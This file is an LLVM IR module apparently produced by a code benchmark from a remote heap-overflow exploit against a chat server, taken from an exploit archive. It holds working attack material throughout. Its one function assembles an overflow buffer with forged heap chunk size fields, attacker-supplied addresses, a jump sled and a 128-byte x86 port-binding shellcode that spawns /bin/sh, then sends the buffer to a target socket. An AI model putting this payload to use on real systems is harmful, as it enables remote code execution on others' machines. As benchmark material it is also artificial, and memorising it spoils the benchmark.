; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_33.c___eat_sucks_heap_data_send.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_33.c___eat_sucks_heap_data_send.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.__eat_sucks_heap_data_send.nop_n_jump = private unnamed_addr constant [4 x i8] c"B\0C\EBA", align 1
@__const.__eat_sucks_heap_data_send.oxa_oxd = private unnamed_addr constant [2 x i8] c"\0A\0D", align 1
@__const.__eat_sucks_heap_data_send.p_rev_size = private unnamed_addr constant [4 x i8] c"\FC\FF\FF\FF", align 1
@__const.__eat_sucks_heap_data_send.__size_fd = private unnamed_addr constant [4 x i8] c"\FF\FF\FF\FF", align 1
@__const.__eat_sucks_heap_data_send.chat_inf_send_code = private unnamed_addr constant [3 x i8] c"CHA", align 1
@__const.__eat_sucks_heap_data_send.shellcode = private unnamed_addr constant [128 x i8] c"\EBr^)\C0\89F\10@\89\C3\89F\0C@\89F\08\8DN\08\B0f\CD\80C\C6F\10\10f\89^\14\88F\08)\C0\89\C2\89F\18\B0\90f\89F\16\8DN\14\89N\0C\8DN\08\B0f\CD\80\89^\0CCC\B0f\CD\80\89V\0C\89V\10\B0fC\CD\80\86\C3\B0?)\C9\CD\80\B0?A\CD\80\B0?A\CD\80\88V\07\89v\0C\87\F3\8DK\0C\B0\0B\CD\80\E8\89\FF\FF\FF/bin/sh", align 16
@PORT_Q = common dso_local global i32 0, align 4
@__CLN_DT_LEN = common dso_local global i32 0, align 4
@__OF_BY_ONE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @__eat_sucks_heap_data_send(i32 %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4 x i8], align 1
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca [36864 x i8], align 16
  %12 = alloca [4 x i8], align 1
  %13 = alloca [4 x i8], align 1
  %14 = alloca [1025 x i8], align 16
  %15 = alloca [3 x i8], align 1
  %16 = alloca [128 x i8], align 16
  %17 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %18 = bitcast [4 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %18, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.__eat_sucks_heap_data_send.nop_n_jump, i32 0, i32 0), i64 4, i1 false)
  store i32 0, i32* %9, align 4
  %19 = bitcast [2 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %19, i8* align 1 getelementptr inbounds ([2 x i8], [2 x i8]* @__const.__eat_sucks_heap_data_send.oxa_oxd, i32 0, i32 0), i64 2, i1 false)
  %20 = bitcast [4 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %20, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.__eat_sucks_heap_data_send.p_rev_size, i32 0, i32 0), i64 4, i1 false)
  %21 = bitcast [4 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %21, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.__eat_sucks_heap_data_send.__size_fd, i32 0, i32 0), i64 4, i1 false)
  %22 = bitcast [3 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %22, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.__eat_sucks_heap_data_send.chat_inf_send_code, i32 0, i32 0), i64 3, i1 false)
  %23 = bitcast [128 x i8]* %16 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %23, i8* align 16 getelementptr inbounds ([128 x i8], [128 x i8]* @__const.__eat_sucks_heap_data_send.shellcode, i32 0, i32 0), i64 128, i1 false)
  store i32 128, i32* %17, align 4
  %24 = getelementptr inbounds [1025 x i8], [1025 x i8]* %14, i64 0, i64 0
  %25 = call i32 @memset(i8* %24, i32 130, i32 1025)
  %26 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %27 = call i32 @memset(i8* %26, i32 0, i32 36864)
  %28 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %29 = load i32, i32* %9, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = getelementptr inbounds [3 x i8], [3 x i8]* %15, i64 0, i64 0
  %33 = call i32 @memcpy(i8* %31, i8* %32, i32 3)
  %34 = load i32, i32* %9, align 4
  %35 = sext i32 %34 to i64
  %36 = add i64 %35, 3
  %37 = trunc i64 %36 to i32
  store i32 %37, i32* %9, align 4
  %38 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %39 = load i32, i32* %9, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = call i32 @memset(i8* %41, i32 32, i32 1)
  %43 = load i32, i32* %9, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %9, align 4
  %45 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %46 = load i32, i32* %9, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = getelementptr inbounds [1025 x i8], [1025 x i8]* %14, i64 0, i64 0
  %50 = call i32 @memcpy(i8* %48, i8* %49, i32 1025)
  %51 = load i32, i32* %9, align 4
  %52 = sext i32 %51 to i64
  %53 = add i64 %52, 1025
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %9, align 4
  %55 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %56 = load i32, i32* %9, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 0
  %60 = call i32 @memcpy(i8* %58, i8* %59, i32 4)
  %61 = load i32, i32* %9, align 4
  %62 = sext i32 %61 to i64
  %63 = add i64 %62, 4
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %9, align 4
  %65 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = getelementptr inbounds [4 x i8], [4 x i8]* %13, i64 0, i64 0
  %70 = call i32 @memcpy(i8* %68, i8* %69, i32 4)
  %71 = load i32, i32* %9, align 4
  %72 = sext i32 %71 to i64
  %73 = add i64 %72, 4
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %9, align 4
  %75 = load i32, i32* %5, align 4
  %76 = sub nsw i32 %75, 12
  %77 = sext i32 %76 to i64
  %78 = load i32, i32* %9, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 %79
  %81 = bitcast i8* %80 to i64*
  store i64 %77, i64* %81, align 1
  %82 = load i32, i32* %9, align 4
  %83 = add nsw i32 %82, 4
  store i32 %83, i32* %9, align 4
  %84 = load i32, i32* %6, align 4
  %85 = sext i32 %84 to i64
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 %87
  %89 = bitcast i8* %88 to i64*
  store i64 %85, i64* %89, align 1
  %90 = load i32, i32* %9, align 4
  %91 = add nsw i32 %90, 4
  store i32 %91, i32* %9, align 4
  %92 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = call i32 @memset(i8* %95, i32 32, i32 1)
  %97 = load i32, i32* %9, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %9, align 4
  store i32 0, i32* %7, align 4
  br label %99

99:                                               ; preds = %113, %3
  %100 = load i32, i32* %7, align 4
  %101 = icmp slt i32 %100, 400
  br i1 %101, label %102, label %116

102:                                              ; preds = %99
  %103 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %108 = call i32 @memcpy(i8* %106, i8* %107, i32 4)
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = add i64 %110, 4
  %112 = trunc i64 %111 to i32
  store i32 %112, i32* %9, align 4
  br label %113

113:                                              ; preds = %102
  %114 = load i32, i32* %7, align 4
  %115 = add nsw i32 %114, 4
  store i32 %115, i32* %7, align 4
  br label %99

116:                                              ; preds = %99
  %117 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = getelementptr inbounds [128 x i8], [128 x i8]* %16, i64 0, i64 0
  %122 = call i32 @memcpy(i8* %120, i8* %121, i32 128)
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = add i64 %124, 128
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %9, align 4
  %127 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %128 = load i32, i32* %9, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %132 = call i32 @memcpy(i8* %130, i8* %131, i32 2)
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = add i64 %134, 2
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %9, align 4
  %137 = load i32, i32* %4, align 4
  %138 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %139 = getelementptr inbounds [36864 x i8], [36864 x i8]* %11, i64 0, i64 0
  %140 = call i32 @strlen(i8* %139)
  %141 = call i32 @send(i32 %137, i8* %138, i32 %140, i32 0)
  %142 = load i32, i32* %4, align 4
  ret i32 %142
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
